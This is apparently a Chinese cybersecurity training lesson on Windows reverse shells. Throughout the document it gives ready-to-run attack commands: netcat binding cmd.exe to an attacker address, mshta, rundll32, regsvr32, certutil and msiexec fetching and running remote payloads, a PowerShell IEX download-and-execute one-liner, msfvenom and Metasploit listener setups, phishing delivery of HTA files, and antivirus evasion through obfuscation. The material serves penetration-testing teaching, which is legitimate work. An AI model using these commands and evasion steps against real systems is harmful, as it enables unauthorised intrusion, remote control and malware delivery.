# 网络安全就业推荐 P61：第27天 - Windows反弹Shell方法大全 🛡️💻

![](img/789fbd9667971d0bbdc47a1added5486_1.png)

![](img/789fbd9667971d0bbdc47a1added5486_3.png)

## 概述

![](img/789fbd9667971d0bbdc47a1added5486_5.png)

![](img/789fbd9667971d0bbdc47a1added5486_7.png)

在本节课中，我们将要学习Windows系统下的反弹Shell技术。课程首先会补充上节课遗留的FTP文件传输问题，然后详细介绍正向Shell与反向Shell（反弹Shell）的核心概念，并重点讲解多种在Windows环境下实现反弹Shell的实用方法。

![](img/789fbd9667971d0bbdc47a1added5486_9.png)

![](img/789fbd9667971d0bbdc47a1added5486_11.png)

---

## 上节课内容补充：FTP文件传输

上一节我们介绍了内网文件传输的多种方式。在讲解使用FTP方式时，曾遇到一个问题。本节我们首先对此进行补充说明。

![](img/789fbd9667971d0bbdc47a1added5486_13.png)

![](img/789fbd9667971d0bbdc47a1added5486_15.png)

![](img/789fbd9667971d0bbdc47a1added5486_17.png)

![](img/789fbd9667971d0bbdc47a1added5486_19.png)

上节课我们编写了一个名为 `ftp.txt` 的脚本，并通过 `copy` 命令将其写入目标机器。然后使用以下语句自动下载文件：
```cmd
ftp -A -s:ftp.txt
```
该脚本对应的FTP命令序列如下：
```
open [FTP服务器IP]
anonymous
[回车]
get 6789.exe
quit
```
执行流程是：连接FTP服务器 -> 匿名登录 (`anonymous`，密码为空) -> 使用 `get` 命令下载指定文件 -> 退出。通过这种方式，可以成功将文件从FTP服务器下载到目标机器的本地。

![](img/789fbd9667971d0bbdc47a1added5486_21.png)

![](img/789fbd9667971d0bbdc47a1added5486_23.png)

在服务端，我们使用Python启动一个简易的FTP服务器：
```bash
python3 -m pyftpdlib
```
客户端连接后，可以使用 `ls` 命令查看服务器端（默认为启动服务的目录，如root目录）的文件列表，使用 `get` 下载文件，使用 `put` 上传文件。

![](img/789fbd9667971d0bbdc47a1added5486_25.png)

---

![](img/789fbd9667971d0bbdc47a1added5486_27.png)

## 第一部分：理解反弹Shell 🔄

![](img/789fbd9667971d0bbdc47a1added5486_29.png)

![](img/789fbd9667971d0bbdc47a1added5486_31.png)

![](img/789fbd9667971d0bbdc47a1added5486_33.png)

在深入具体方法之前，我们需要理解两个核心概念：正向Shell和反向Shell。

![](img/789fbd9667971d0bbdc47a1added5486_35.png)

![](img/789fbd9667971d0bbdc47a1added5486_37.png)

![](img/789fbd9667971d0bbdc47a1added5486_38.png)

![](img/789fbd9667971d0bbdc47a1added5486_40.png)

![](img/789fbd9667971d0bbdc47a1added5486_42.png)

### 正向Shell (Bind Shell)

![](img/789fbd9667971d0bbdc47a1added5486_44.png)

![](img/789fbd9667971d0bbdc47a1added5486_46.png)

![](img/789fbd9667971d0bbdc47a1added5486_48.png)

![](img/789fbd9667971d0bbdc47a1added5486_50.png)

![](img/789fbd9667971d0bbdc47a1added5486_52.png)

**控制端主动发起连接请求去连接被控制端，且中间的网络链路不存在阻碍。**

![](img/789fbd9667971d0bbdc47a1added5486_54.png)

![](img/789fbd9667971d0bbdc47a1added5486_56.png)

![](img/789fbd9667971d0bbdc47a1added5486_58.png)

**原理**：攻击者（控制端）主动连接目标机器（被控制端）监听的特定端口，从而获取一个Shell。
**适用场景**：目标机器拥有公网IP，或攻击者可以直接访问到目标机器，中间无防火墙等设备拦截。
**示意图**：
```
控制端 (Attacker) ---主动连接---> 被控端 (Target)
```

### 反向Shell / 反弹Shell (Reverse Shell)

**被控制端主动发起连接请求去连接控制端。**

![](img/789fbd9667971d0bbdc47a1added5486_60.png)

![](img/789fbd9667971d0bbdc47a1added5486_61.png)

![](img/789fbd9667971d0bbdc47a1added5486_63.png)

**原理**：攻击者先在自有服务器上监听一个端口。然后通过某种方式让目标机器主动连接攻击者的服务器端口，并将自己的Shell重定向到该连接，从而攻击者获得Shell。
**适用场景**：目标机器处于内网、有防火墙限制、或IP动态变化，导致攻击者无法直接连接时。因为内网机器通常可以主动访问外网。
**示意图**：
```
控制端 (Attacker) <---主动连接--- 被控端 (Target)
```
**核心区别**：连接发起的方向相反。反向Shell是“被控端找控制端”，常用于穿透网络限制。

![](img/789fbd9667971d0bbdc47a1added5486_65.png)

![](img/789fbd9667971d0bbdc47a1added5486_67.png)

---

![](img/789fbd9667971d0bbdc47a1added5486_69.png)

![](img/789fbd9667971d0bbdc47a1added5486_71.png)

![](img/789fbd9667971d0bbdc47a1added5486_73.png)

![](img/789fbd9667971d0bbdc47a1added5486_75.png)

## 第二部分：Windows反弹Shell方法详解 🧰

![](img/789fbd9667971d0bbdc47a1added5486_77.png)

![](img/789fbd9667971d0bbdc47a1added5486_79.png)

![](img/789fbd9667971d0bbdc47a1added5486_81.png)

![](img/789fbd9667971d0bbdc47a1added5486_83.png)

![](img/789fbd9667971d0bbdc47a1added5486_85.png)

理解了基本原理后，本节我们来看看在Windows系统上实现反弹Shell的多种具体方法。

![](img/789fbd9667971d0bbdc47a1added5486_87.png)

![](img/789fbd9667971d0bbdc47a1added5486_89.png)

![](img/789fbd9667971d0bbdc47a1added5486_91.png)

### 方法一：使用 NC (Netcat)

![](img/789fbd9667971d0bbdc47a1added5486_93.png)

![](img/789fbd9667971d0bbdc47a1added5486_95.png)

![](img/789fbd9667971d0bbdc47a1added5486_97.png)

![](img/789fbd9667971d0bbdc47a1added5486_98.png)

![](img/789fbd9667971d0bbdc47a1added5486_100.png)

![](img/789fbd9667971d0bbdc47a1added5486_102.png)

![](img/789fbd9667971d0bbdc47a1added5486_103.png)

![](img/789fbd9667971d0bbdc47a1added5486_104.png)

NC是一个网络工具中的“瑞士军刀”，常用于建立网络连接。

![](img/789fbd9667971d0bbdc47a1added5486_106.png)

![](img/789fbd9667971d0bbdc47a1added5486_108.png)

![](img/789fbd9667971d0bbdc47a1added5486_110.png)

![](img/789fbd9667971d0bbdc47a1added5486_112.png)

![](img/789fbd9667971d0bbdc47a1added5486_114.png)

![](img/789fbd9667971d0bbdc47a1added5486_116.png)

#### 1. 正向Shell (使用NC)

**在目标机器（被控端）上执行**：
```cmd
nc -lvp 6666 -e cmd.exe
```
*   `-l`: 监听模式
*   `-v`: 显示详细信息
*   `-p 6666`: 指定监听端口
*   `-e cmd.exe`: 连接建立后执行的程序（此处为cmd）

**在攻击机器（控制端）上执行**：
```bash
nc [目标IP] 6666
```
**原理**：被控端将`cmd.exe`绑定到本地6666端口。控制端连接该端口后，直接与被控端的`cmd.exe`交互。

![](img/789fbd9667971d0bbdc47a1added5486_118.png)

![](img/789fbd9667971d0bbdc47a1added5486_120.png)

![](img/789fbd9667971d0bbdc47a1added5486_122.png)

![](img/789fbd9667971d0bbdc47a1added5486_124.png)

![](img/789fbd9667971d0bbdc47a1added5486_126.png)

#### 2. 反向Shell (使用NC)

![](img/789fbd9667971d0bbdc47a1added5486_128.png)

![](img/789fbd9667971d0bbdc47a1added5486_130.png)

![](img/789fbd9667971d0bbdc47a1added5486_132.png)

![](img/789fbd9667971d0bbdc47a1added5486_133.png)

![](img/789fbd9667971d0bbdc47a1added5486_135.png)

![](img/789fbd9667971d0bbdc47a1added5486_137.png)

![](img/789fbd9667971d0bbdc47a1added5486_139.png)

**在攻击机器（控制端）上先监听**：
```bash
nc -lvp 54321
```

![](img/789fbd9667971d0bbdc47a1added5486_141.png)

![](img/789fbd9667971d0bbdc47a1added5486_143.png)

![](img/789fbd9667971d0bbdc47a1added5486_145.png)

![](img/789fbd9667971d0bbdc47a1added5486_146.png)

**在目标机器（被控端）上执行**：
```cmd
nc [控制端IP] 54321 -e cmd.exe
```
**原理**：控制端监听54321端口。被控端主动连接到控制端的54321端口，并将自身的`cmd.exe`重定向到该连接。控制端从而获得Shell。

---

### 方法二：利用 MSHTA 执行远程HTA文件

![](img/789fbd9667971d0bbdc47a1added5486_148.png)

`mshta.exe` 是Windows自带的用于解释执行HTA（HTML Application）文件的程序。

#### 方式1：使用MSF的 `exploit/windows/misc/hta_server` 模块

![](img/789fbd9667971d0bbdc47a1added5486_150.png)

![](img/789fbd9667971d0bbdc47a1added5486_152.png)

![](img/789fbd9667971d0bbdc47a1added5486_154.png)

以下是操作步骤：

![](img/789fbd9667971d0bbdc47a1added5486_156.png)

![](img/789fbd9667971d0bbdc47a1added5486_158.png)

1.  **启动MSF并加载模块**：
    ```bash
    use exploit/windows/misc/hta_server
    ```
2.  **配置模块选项**：
    ```bash
    set SRVHOST [你的MSF服务器IP]
    set SRVPORT 8080
    set LHOST [你的监听IP]
    set LPORT 5555
    ```
    *   `SRVHOST/SRVPORT`: HTA文件托管服务器的地址和端口。
    *   `LHOST/LPORT`: 反弹Shell接收端的地址和端口。
3.  **配置Payload**：
    ```bash
    set payload windows/x64/meterpreter/reverse_tcp
    ```
4.  **执行并生成恶意HTA链接**：
    ```bash
    exploit -j
    ```
    执行后，模块会返回一个URL，例如 `http://[SRVHOST]:[SRVPORT]/[随机].hta`。
5.  **在目标机器上触发**：
    在目标机器的命令行中执行：
    ```cmd
    mshta http://[你的MSF服务器IP]:8080/[随机].hta
    ```
6.  **获取Shell**：
    执行后，MSF的监听器会收到来自目标机器的反向连接，并建立一个Meterpreter会话。

![](img/789fbd9667971d0bbdc47a1added5486_160.png)

![](img/789fbd9667971d0bbdc47a1added5486_161.png)

**原理**：生成的HTA文件包含恶意PowerShell脚本，该脚本会下载并执行Meterpreter的Stage载荷，从而建立反向连接。

![](img/789fbd9667971d0bbdc47a1added5486_163.png)

![](img/789fbd9667971d0bbdc47a1added5486_165.png)

![](img/789fbd9667971d0bbdc47a1added5486_166.png)

#### 方式2：使用Cobalt Strike生成HTA文件

![](img/789fbd9667971d0bbdc47a1added5486_167.png)

1.  在Cobalt Strike中，选择 `攻击 -> 生成后门 -> HTML Application`。
2.  选择 `PowerShell` 类型，并指定一个监听器。
3.  生成后，会得到一个 `.hta` 文件。
4.  通过钓鱼邮件、文件共享等方式诱使目标用户执行，或在已获得命令执行权限的情况下，直接在目标机器命令行执行：
    ```cmd
    mshta http://[CS服务器IP]:[端口]/payload.hta
    ```

![](img/789fbd9667971d0bbdc47a1added5486_169.png)

![](img/789fbd9667971d0bbdc47a1added5486_171.png)

![](img/789fbd9667971d0bbdc47a1added5486_172.png)

![](img/789fbd9667971d0bbdc47a1added5486_174.png)

![](img/789fbd9667971d0bbdc47a1added5486_175.png)

![](img/789fbd9667971d0bbdc47a1added5486_176.png)

![](img/789fbd9667971d0bbdc47a1added5486_177.png)

![](img/789fbd9667971d0bbdc47a1added5486_178.png)

---

![](img/789fbd9667971d0bbdc47a1added5486_179.png)

![](img/789fbd9667971d0bbdc47a1added5486_180.png)

![](img/789fbd9667971d0bbdc47a1added5486_181.png)

![](img/789fbd9667971d0bbdc47a1added5486_182.png)

![](img/789fbd9667971d0bbdc47a1added5486_183.png)

![](img/789fbd9667971d0bbdc47a1added5486_185.png)

![](img/789fbd9667971d0bbdc47a1added5486_186.png)

![](img/789fbd9667971d0bbdc47a1added5486_187.png)

![](img/789fbd9667971d0bbdc47a1added5486_189.png)

![](img/789fbd9667971d0bbdc47a1added5486_190.png)

![](img/789fbd9667971d0bbdc47a1added5486_192.png)

![](img/789fbd9667971d0bbdc47a1added5486_194.png)

### 方法三：利用 Rundll32 执行远程DLL文件

![](img/789fbd9667971d0bbdc47a1added5486_196.png)

![](img/789fbd9667971d0bbdc47a1added5486_198.png)

![](img/789fbd9667971d0bbdc47a1added5486_200.png)

![](img/789fbd9667971d0bbdc47a1added5486_202.png)

![](img/789fbd9667971d0bbdc47a1added5486_204.png)

![](img/789fbd9667971d0bbdc47a1added5486_206.png)

`rundll32.exe` 可以调用DLL文件中的导出函数。

![](img/789fbd9667971d0bbdc47a1added5486_208.png)

![](img/789fbd9667971d0bbdc47a1added5486_210.png)

![](img/789fbd9667971d0bbdc47a1added5486_212.png)

#### 方式1：使用MSF的 `exploit/windows/smb/smb_delivery` 模块

1.  **加载模块并配置**：
    ```bash
    use exploit/windows/smb/smb_delivery
    set payload windows/x64/meterpreter/reverse_tcp
    set LHOST [监听IP]
    set LPORT [监听端口]
    exploit -j
    ```
2.  **获取执行命令**：
    执行后，MSF会生成一个类似如下的命令：
    ```cmd
    rundll32.exe \\[你的IP]\test\test.dll,0
    ```
3.  **在目标机器上执行**：
    将上述命令在目标机器上执行。
4.  **局限性**：该方法依赖于SMB协议。在Windows 10等高版本系统上，由于默认禁用SMBv1或安全策略限制，可能会失败。

**原理**：MSF模块启动一个SMB共享，其中包含恶意DLL。`rundll32` 通过UNC路径远程加载并执行该DLL中的代码。

![](img/789fbd9667971d0bbdc47a1added5486_214.png)

![](img/789fbd9667971d0bbdc47a1added5486_216.png)

![](img/789fbd9667971d0bbdc47a1added5486_218.png)

#### 方式2：手动生成DLL并执行

![](img/789fbd9667971d0bbdc47a1added5486_220.png)

![](img/789fbd9667971d0bbdc47a1added5486_222.png)

![](img/789fbd9667971d0bbdc47a1added5486_224.png)

![](img/789fbd9667971d0bbdc47a1added5486_226.png)

![](img/789fbd9667971d0bbdc47a1added5486_228.png)

1.  **使用MSF生成恶意DLL**：
    ```bash
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[IP] LPORT=[端口] -f dll -o shell.dll
    ```
2.  **将DLL文件上传到目标机器**（利用之前学过的文件传输方法）。
3.  **在目标机器上使用Rundll32执行**（**注意使用绝对路径**）：
    ```cmd
    rundll32.exe C:\Path\To\shell.dll,StartW
    ```
4.  **在MSF中启动监听器**：
    ```bash
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set LHOST [IP]
    set LPORT [端口]
    exploit
    ```

![](img/789fbd9667971d0bbdc47a1added5486_230.png)

![](img/789fbd9667971d0bbdc47a1added5486_232.png)

![](img/789fbd9667971d0bbdc47a1added5486_234.png)

![](img/789fbd9667971d0bbdc47a1added5486_236.png)

![](img/789fbd9667971d0bbdc47a1added5486_238.png)

---

![](img/789fbd9667971d0bbdc47a1added5486_239.png)

![](img/789fbd9667971d0bbdc47a1added5486_241.png)

![](img/789fbd9667971d0bbdc47a1added5486_243.png)

![](img/789fbd9667971d0bbdc47a1added5486_244.png)

![](img/789fbd9667971d0bbdc47a1added5486_246.png)

### 方法四：利用 Regsvr32 执行远程SCRIBLET文件

![](img/789fbd9667971d0bbdc47a1added5486_248.png)

`regsvr32.exe` 用于注册和注销DLL等组件，但它可以远程执行`.sct`脚本文件。

![](img/789fbd9667971d0bbdc47a1added5486_250.png)

![](img/789fbd9667971d0bbdc47a1added5486_252.png)

![](img/789fbd9667971d0bbdc47a1added5486_253.png)

![](img/789fbd9667971d0bbdc47a1added5486_255.png)

#### 使用MSF的 `exploit/windows/misc/regsvr32_applocker_bypass_server` 模块

![](img/789fbd9667971d0bbdc47a1added5486_257.png)

![](img/789fbd9667971d0bbdc47a1added5486_259.png)

![](img/789fbd9667971d0bbdc47a1added5486_261.png)

![](img/789fbd9667971d0bbdc47a1added5486_263.png)

1.  **加载模块并配置**：
    ```bash
    use exploit/windows/misc/regsvr32_applocker_bypass_server
    set payload windows/x64/meterpreter/reverse_tcp
    set LHOST [监听IP]
    set LPORT [监听端口]
    set TARGET 3 # 对应 regsvr32 方法
    exploit -j
    ```
2.  **获取执行命令**：
    模块会生成一条PowerShell命令，其中包含远程`.sct`文件的地址。
3.  **在目标机器上执行该PowerShell命令**。
4.  **原理**：`.sct`文件是一个XML格式的脚本，其中包含加密的PowerShell载荷。`regsvr32` 会下载并执行该脚本，最终加载Meterpreter。

![](img/789fbd9667971d0bbdc47a1added5486_265.png)

![](img/789fbd9667971d0bbdc47a1added5486_267.png)

![](img/789fbd9667971d0bbdc47a1added5486_269.png)

![](img/789fbd9667971d0bbdc47a1added5486_271.png)

![](img/789fbd9667971d0bbdc47a1added5486_273.png)

---

![](img/789fbd9667971d0bbdc47a1added5486_275.png)

![](img/789fbd9667971d0bbdc47a1added5486_276.png)

![](img/789fbd9667971d0bbdc47a1added5486_277.png)

![](img/789fbd9667971d0bbdc47a1added5486_279.png)

![](img/789fbd9667971d0bbdc47a1added5486_280.png)

![](img/789fbd9667971d0bbdc47a1added5486_281.png)

![](img/789fbd9667971d0bbdc47a1added5486_283.png)

![](img/789fbd9667971d0bbdc47a1added5486_285.png)

### 方法五：利用 Certutil 下载并执行文件

![](img/789fbd9667971d0bbdc47a1added5486_287.png)

![](img/789fbd9667971d0bbdc47a1added5486_289.png)

`certutil.exe` 是Windows证书工具，但常被用于下载文件。

![](img/789fbd9667971d0bbdc47a1added5486_291.png)

![](img/789fbd9667971d0bbdc47a1added5486_293.png)

![](img/789fbd9667971d0bbdc47a1added5486_295.png)

![](img/789fbd9667971d0bbdc47a1added5486_297.png)

![](img/789fbd9667971d0bbdc47a1added5486_299.png)

![](img/789fbd9667971d0bbdc47a1added5486_301.png)

1.  **在攻击机生成Payload并启动Web服务**：
    ```bash
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[IP] LPORT=[端口] -f exe -o shell.exe
    python3 -m http.server 80
    ```
2.  **在攻击机启动MSF监听器**。
3.  **在目标机器执行下载与运行**：
    ```cmd
    certutil -urlcache -split -f http://[攻击机IP]/shell.exe shell.exe && shell.exe
    ```

---

![](img/789fbd9667971d0bbdc47a1added5486_303.png)

![](img/789fbd9667971d0bbdc47a1added5486_305.png)

![](img/789fbd9667971d0bbdc47a1added5486_307.png)

![](img/789fbd9667971d0bbdc47a1added5486_309.png)

![](img/789fbd9667971d0bbdc47a1added5486_310.png)

### 方法六：利用 PowerShell 的强大功能

![](img/789fbd9667971d0bbdc47a1added5486_312.png)

![](img/789fbd9667971d0bbdc47a1added5486_314.png)

![](img/789fbd9667971d0bbdc47a1added5486_316.png)

![](img/789fbd9667971d0bbdc47a1added5486_318.png)

![](img/789fbd9667971d0bbdc47a1added5486_320.png)

![](img/789fbd9667971d0bbdc47a1added5486_322.png)

PowerShell是Windows上功能强大的脚本语言和命令行工具。

![](img/789fbd9667971d0bbdc47a1added5486_324.png)

![](img/789fbd9667971d0bbdc47a1added5486_325.png)

![](img/789fbd9667971d0bbdc47a1added5486_327.png)

![](img/789fbd9667971d0bbdc47a1added5486_329.png)

![](img/789fbd9667971d0bbdc47a1added5486_331.png)

#### 方式1：使用 PowerCat (PowerShell版的NC)

![](img/789fbd9667971d0bbdc47a1added5486_333.png)

![](img/789fbd9667971d0bbdc47a1added5486_335.png)

![](img/789fbd9667971d0bbdc47a1added5486_337.png)

![](img/789fbd9667971d0bbdc47a1added5486_339.png)

1.  **下载PowerCat脚本**，并在攻击机启动Web服务托管它。
2.  **在攻击机用NC监听端口**：
    ```bash
    nc -lvp 12345
    ```
3.  **在目标机器通过PowerShell远程加载并执行PowerCat**：
    ```powershell
    powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://[攻击机IP]/powercat.ps1');powercat -c [攻击机IP] -p 12345 -e cmd"
    ```
    *   `IEX(...)`：下载并执行远程脚本。
    *   `powercat -c ... -e cmd`：连接到攻击机IP的12345端口，并反弹cmd shell。

![](img/789fbd9667971d0bbdc47a1added5486_341.png)

![](img/789fbd9667971d0bbdc47a1added5486_343.png)

#### 方式2：使用MSF的 `web_delivery` 模块 (PSH目标)

![](img/789fbd9667971d0bbdc47a1added5486_345.png)

![](img/789fbd9667971d0bbdc47a1added5486_347.png)

![](img/789fbd9667971d0bbdc47a1added5486_349.png)

![](img/789fbd9667971d0bbdc47a1added5486_351.png)

1.  **加载模块并配置为PowerShell目标**：
    ```bash
    use exploit/multi/script/web_delivery
    set target 2 # PSH
    set payload windows/x64/meterpreter/reverse_tcp
    set LHOST [IP]
    set LPORT [端口]
    exploit -j
    ```
2.  **在目标机器执行生成的PowerShell命令**。

![](img/789fbd9667971d0bbdc47a1added5486_353.png)

#### 方式3：通过PowerShell调用 CScript 执行脚本

可以生成VBS或JS格式的Payload，然后用PowerShell下载并调用`cscript.exe`执行。
```powershell
$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName='cscript.exe';$p.StartInfo.Arguments='C:\Windows\Temp\payload.vbs';$p.Start()
```

![](img/789fbd9667971d0bbdc47a1added5486_355.png)

![](img/789fbd9667971d0bbdc47a1added5486_357.png)

![](img/789fbd9667971d0bbdc47a1added5486_359.png)

![](img/789fbd9667971d0bbdc47a1added5486_361.png)

![](img/789fbd9667971d0bbdc47a1added5486_363.png)

---

![](img/789fbd9667971d0bbdc47a1added5486_365.png)

![](img/789fbd9667971d0bbdc47a1added5486_367.png)

![](img/789fbd9667971d0bbdc47a1added5486_369.png)

![](img/789fbd9667971d0bbdc47a1added5486_371.png)

### 方法七：利用 Msiexec 执行远程MSI安装包

![](img/789fbd9667971d0bbdc47a1added5486_373.png)

![](img/789fbd9667971d0bbdc47a1added5486_374.png)

![](img/789fbd9667971d0bbdc47a1added5486_375.png)

![](img/789fbd9667971d0bbdc47a1added5486_377.png)

![](img/789fbd9667971d0bbdc47a1added5486_378.png)

![](img/789fbd9667971d0bbdc47a1added5486_380.png)

![](img/789fbd9667971d0bbdc47a1added5486_382.png)

![](img/789fbd9667971d0bbdc47a1added5486_384.png)

`msiexec.exe` 是Windows安装器，可以执行远程的MSI文件。

1.  **使用MSF生成恶意MSI文件**：
    ```bash
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[IP] LPORT=[端口] -f msi -o setup.msi
    ```
2.  **在攻击机启动Web服务托管`setup.msi`，并启动MSF监听器**。
3.  **在目标机器执行**：
    ```cmd
    msiexec /q /i http://[攻击机IP]/setup.msi
    ```
    *   `/q`: 安静模式
    *   `/i`: 安装

![](img/789fbd9667971d0bbdc47a1added5486_386.png)

![](img/789fbd9667971d0bbdc47a1added5486_388.png)

![](img/789fbd9667971d0bbdc47a1added5486_390.png)

![](img/789fbd9667971d0bbdc47a1added5486_392.png)

![](img/789fbd9667971d0bbdc47a1added5486_393.png)

![](img/789fbd9667971d0bbdc47a1added5486_394.png)

![](img/789fbd9667971d0bbdc47a1added5486_395.png)

![](img/789fbd9667971d0bbdc47a1added5486_397.png)

---

![](img/789fbd9667971d0bbdc47a1added5486_398.png)

![](img/789fbd9667971d0bbdc47a1added5486_400.png)

![](img/789fbd9667971d0bbdc47a1added5486_402.png)

![](img/789fbd9667971d0bbdc47a1added5486_403.png)

![](img/789fbd9667971d0bbdc47a1added5486_404.png)

![](img/789fbd9667971d0bbdc47a1added5486_406.png)

![](img/789fbd9667971d0bbdc47a1added5486_408.png)

![](img/789fbd9667971d0bbdc47a1added5486_410.png)

### 方法八：生成EXE文件并配合PowerShell执行

![](img/789fbd9667971d0bbdc47a1added5486_412.png)

![](img/789fbd9667971d0bbdc47a1added5486_414.png)

![](img/789fbd9667971d0bbdc47a1added5486_415.png)

![](img/789fbd9667971d0bbdc47a1added5486_417.png)

这是最直接的方式。

1.  生成EXE格式的Payload。
2.  通过PowerShell下载并执行：
    ```powershell
    (New-Object Net.WebClient).DownloadFile('http://[攻击机IP]/shell.exe','shell.exe');Start-Process .\shell.exe
    ```
    或者使用 `Start` 命令：
    ```powershell
    Start-Process .\shell.exe
    # 或直接
    .\shell.exe
    ```

![](img/789fbd9667971d0bbdc47a1added5486_419.png)

![](img/789fbd9667971d0bbdc47a1added5486_421.png)

![](img/789fbd9667971d0bbdc47a1added5486_423.png)

![](img/789fbd9667971d0bbdc47a1added5486_425.png)

![](img/789fbd9667971d0bbdc47a1added5486_427.png)

![](img/789fbd9667971d0bbdc47a1added5486_429.png)

---

![](img/789fbd9667971d0bbdc47a1added5486_431.png)

![](img/789fbd9667971d0bbdc47a1added5486_433.png)

### 方法九：PowerShell代码混淆与免杀

![](img/789fbd9667971d0bbdc47a1added5486_435.png)

![](img/789fbd9667971d0bbdc47a1added5486_437.png)

![](img/789fbd9667971d0bbdc47a1added5486_439.png)

![](img/789fbd9667971d0bbdc47a1added5486_441.png)

![](img/789fbd9667971d0bbdc47a1added5486_443.png)

![](img/789fbd9667971d0bbdc47a1added5486_445.png)

![](img/789fbd9667971d0bbdc47a1added5486_447.png)

直接使用上述PowerShell命令容易被杀毒软件检测。可以使用混淆工具来绕过。

![](img/789fbd9667971d0bbdc47a1added5486_449.png)

![](img/789fbd9667971d0bbdc47a1added5486_450.png)

![](img/789fbd9667971d0bbdc47a1added5486_452.png)

![](img/789fbd9667971d0bbdc47a1added5486_453.png)

![](img/789fbd9667971d0bbdc47a1added5486_455.png)

![](img/789fbd9667971d0bbdc47a1added5486_456.png)

![](img/789fbd9667971d0bbdc47a1added5486_458.png)

![](img/789fbd9667971d0bbdc47a1added5486_460.png)

![](img/789fbd9667971d0bbdc47a1added5486_462.png)

一个强大的工具是 **Invoke-Obfuscation**。

![](img/789fbd9667971d0bbdc47a1added5486_463.png)

![](img/789fbd9667971d0bbdc47a1added5486_464.png)

![](img/789fbd9667971d0bbdc47a1added5486_465.png)

![](img/789fbd9667971d0bbdc47a1added5486_466.png)

![](img/789fbd9667971d0bbdc47a1added5486_467.png)

![](img/789fbd9667971d0bbdc47a1added5486_469.png)

![](img/789fbd9667971d0bbdc47a1added5486_471.png)

![](img/789fbd9667971d0bbdc47a1added5486_473.png)

![](img/789fbd9667971d0bbdc47a1added5486_475.png)

![](img/789fbd9667971d0bbdc47a1added5486_476.png)

**基本使用步骤**：
1.  在PowerShell中导入模块：
    ```powershell
    Import-Module .\Invoke-Obfuscation.psd1
    Invoke-Obfuscation
    ```
2.  设置要混淆的脚本文件：
    ```
    SET SCRIPTPATH .\original_payload.ps1
    ```
3.  选择混淆方法，例如 `TOKEN`（令牌混淆）：
    ```
    TOKEN
    ALL
    1
    ```
4.  输出混淆后的代码到文件：
    ```
    OUT .\obfuscated_payload.ps1
    ```

![](img/789fbd9667971d0bbdc47a1added5486_478.png)

![](img/789fbd9667971d0bbdc47a1added5486_479.png)

![](img/789fbd9667971d0bbdc47a1added5486_481.png)

![](img/789fbd9667971d0bbdc47a1added5486_482.png)

![](img/789fbd9667971d0bbdc47a1added5486_484.png)

![](img/789fbd9667971d0bbdc47a1added5486_486.png)

![](img/789fbd9667971d0bbdc47a1added5486_488.png)

![](img/789fbd9667971d0bbdc47a1added5486_490.png)

混淆后的脚本能有效规避部分静态查杀，但需注意动态行为可能仍会被高级杀软检测。

![](img/789fbd9667971d0bbdc47a1added5486_492.png)

![](img/789fbd9667971d0bbdc47a1added5486_494.png)

![](img/789fbd9667971d0bbdc47a1added5486_496.png)

![](img/789fbd9667971d0bbdc47a1added5486_497.png)

![](img/789fbd9667971d0bbdc47a1added5486_499.png)

![](img/789fbd9667971d0bbdc47a1added5486_501.png)

---

![](img/789fbd9667971d0bbdc47a1added5486_503.png)

![](img/789fbd9667971d0bbdc47a1added5486_505.png)

![](img/789fbd9667971d0bbdc47a1added5486_507.png)

![](img/789fbd9667971d0bbdc47a1added5486_509.png)

![](img/789fbd9667971d0bbdc47a1added5486_511.png)

## 实验与总结 🧪

![](img/789fbd9667971d0bbdc47a1added5486_513.png)

![](img/789fbd9667971d0bbdc47a1added5486_515.png)

![](img/789fbd9667971d0bbdc47a1added5486_517.png)

![](img/789fbd9667971d0bbdc47a1added5486_519.png)

![](img/789fbd9667971d0bbdc47a1added5486_521.png)

![](img/789fbd9667971d0bbdc47a1added5486_523.png)

![](img/789fbd9667971d0bbdc47a1added5486_525.png)

### 课后实验

![](img/789fbd9667971d0bbdc47a1added5486_527.png)

![](img/789fbd9667971d0bbdc47a1added5486_529.png)

![](img/789fbd9667971d0bbdc47a1added5486_531.png)

![](img/789fbd9667971d0bbdc47a1added5486_533.png)

![](img/789fbd9667971d0bbdc47a1added5486_535.png)

![](img/789fbd9667971d0bbdc47a1added5486_537.png)

![](img/789fbd9667971d0bbdc47a1added5486_539.png)

请尝试在实验环境中（务必使用虚拟机，勿用于非法用途）实践至少三种本节课介绍的Windows反弹Shell方法，并理解其过程。

![](img/789fbd9667971d0bbdc47a1added5486_541.png)

![](img/789fbd9667971d0bbdc47a1added5486_543.png)

### 课程总结

本节课我们一起学习了Windows系统下的反弹Shell技术。

1.  **核心概念**：我们首先区分了正向Shell与反向Shell（反弹Shell），理解了反弹Shell在穿透网络限制时的关键作用。
2.  **多种方法**：我们详细探讨了九大类实现方法，涵盖了从经典的NC工具，到利用`mshta`、`rundll32`、`regsvr32`、`certutil`、`msiexec`等系统自带程序，再到功能强大的PowerShell及其多种利用技巧（如PowerCat、web_delivery、脚本执行、混淆免杀等）。
3.  **工具结合**：课程演示了如何将Metasploit Framework (MSF) 和 Cobalt Strike (CS) 等渗透测试框架与这些方法结合，自动化生成Payload和建立监听。
4.  **原理理解**：每种方法我们都力求阐明其背后的命令和原理，例如如何通过重定向标准流、远程下载执行代码、调用特定函数等来实现Shell的反弹。

![](img/789fbd9667971d0bbdc47a1added5486_545.png)

掌握这些方法的核心在于理解其**本质**：**让目标机器以某种形式，主动连接攻击者控制的服务器，并在此连接上交互式地执行命令**。在实际安全测试中，需要根据目标环境、权限、防护软件等情况，灵活选择和组合这些方法。